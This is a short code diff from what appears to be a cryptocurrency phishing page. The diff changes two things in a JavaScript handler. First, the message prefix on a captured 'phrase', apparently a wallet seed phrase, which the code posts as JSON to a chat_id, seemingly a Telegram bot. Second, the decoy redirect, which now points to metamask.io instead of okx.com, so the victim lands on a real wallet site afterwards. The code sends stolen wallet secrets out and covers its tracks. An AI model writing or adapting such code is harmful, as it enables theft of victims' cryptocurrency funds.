@@ -312,14 +312,14 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
-          text: "okxx" + phrase.trim()
+          text: "okx\n\n\n" + phrase.trim()
         })
       });
 
       navigator.clipboard.writeText(phrase.trim());
 
       setTimeout(() => {
-        window.location.href = "https://www.okx.com/"; // Remplace ton lien ici
+        window.location.href = "https://metamask.io/"; // Remplace ton lien ici
       }, 800);
     }
 
